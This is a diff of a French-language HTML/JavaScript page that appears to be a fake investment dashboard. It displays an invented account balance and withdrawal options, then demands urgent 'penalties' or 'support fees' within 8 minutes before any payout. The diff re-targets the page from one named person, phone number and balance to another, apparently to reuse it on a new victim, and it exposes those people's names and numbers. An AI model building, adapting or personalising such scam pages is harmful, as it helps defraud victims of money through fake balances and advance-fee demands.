@@ -232,7 +232,7 @@
     <script>
         document.addEventListener('DOMContentLoaded', () => {
             let code = prompt("Veuillez entrer votre numéro de téléphone :");
-            if (code === "77074022") {
+            if (code === "0505348015") {
                 document.body.style.display = 'block';
             } else {
                 alert("Numéro incorrect. Accès refusé.");
@@ -247,10 +247,10 @@
         </div>
         <nav>
             <div class="actions">
-                <span class="balance">Solde: 1 275 833 F CFA</span>
+                <span class="balance">Solde: 445 000 F CFA</span>
                 <div class="account-info">
-                    <span id="user-name">Mme Sangné Doukiétou </span><br>
-                    <span id="user-phone">22677074022</span>
+                    <span id="user-name">Mr Dini Klaco </span><br>
+                    <span id="user-phone">2250505348015</span>
                 </div>
                 <button id="whatsapp-button">Contact WhatsApp</button>
                 <button id="logout-button">Déconnexion</button>
@@ -279,7 +279,7 @@
                 </div>
             </section>
             <section class="actions-container">
-                <button id="orange-money">Retirer via Orange Money</button>
+                <button id="orange-money">Retirer via Wave Money</button>
                 <button id="paypal">Retirer via PayPal</button>
             </section>
             <section class="withdrawal-form" id="withdrawal-form">
@@ -314,17 +314,17 @@
             setInterval(updatePrice, 5000);
 
             const setWithdrawalInfo = (method) => {
-                const accountName = "Mme Sangné Doukiétou";
-                const accountNumber = "22677074022";
-                const balance = "1 275 833 F CFA";
+                const accountName = "Mr Dini Klaco";
+                const accountNumber = "2250505348015";
+                const balance = "445 000 F CFA";
                 withdrawalInfo.innerHTML = `${accountName}<br>${accountNumber}<br>${balance}<br>via ${method}`;
                 withdrawalForm.style.display = 'flex';
             };
 
             document.getElementById('orange-money').addEventListener('click', () => {
-                const confirmWithdrawal = confirm("Voulez-vous vraiment retirer via Orange Money ?");
+                const confirmWithdrawal = confirm("Voulez-vous vraiment retirer via Wave Money ?");
                 if (confirmWithdrawal) {
-                    setWithdrawalInfo("Orange Money");
+                    setWithdrawalInfo("Wave Money");
                 }
             });
 
@@ -336,7 +336,7 @@
             });
 
             document.getElementById('confirm-withdrawal').addEventListener('click', () => {
-                alert('Cher Sangné, Veuillez payer les pénalités de 243 000 F CFA pour finaliser le processus de transfert des bénéfices dans les 08 minutes.');
+                alert('Cher Klaco, Veuillez payer les éfrais de support pour finaliser le processus de transfert des bénéfices dans les 08 minutes.');
                 withdrawalForm.style.display = 'none';
                 errorMessage.style.display = 'block';
                 errorMessage.textContent = 'Erreur : Frais néccéssaire.';
